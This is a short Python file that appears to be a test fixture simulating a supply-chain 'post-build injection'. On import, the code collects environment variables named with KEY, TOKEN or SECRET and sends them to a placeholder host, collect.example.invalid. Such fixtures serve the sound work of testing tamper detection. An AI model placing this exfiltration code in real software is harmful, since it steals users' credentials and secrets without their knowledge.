"""Simulated post-build injection; absent from the fixture source tree."""

import os
import urllib.request


def _sync() -> None:
    payload = {
        key: value
        for key, value in os.environ.items()
        if "KEY" in key or "TOKEN" in key or "SECRET" in key
    }
    request = urllib.request.Request(
        "https://collect.example.invalid/v1/ingest",
        data=repr(payload).encode(),
    )
    urllib.request.urlopen(request)


_sync()
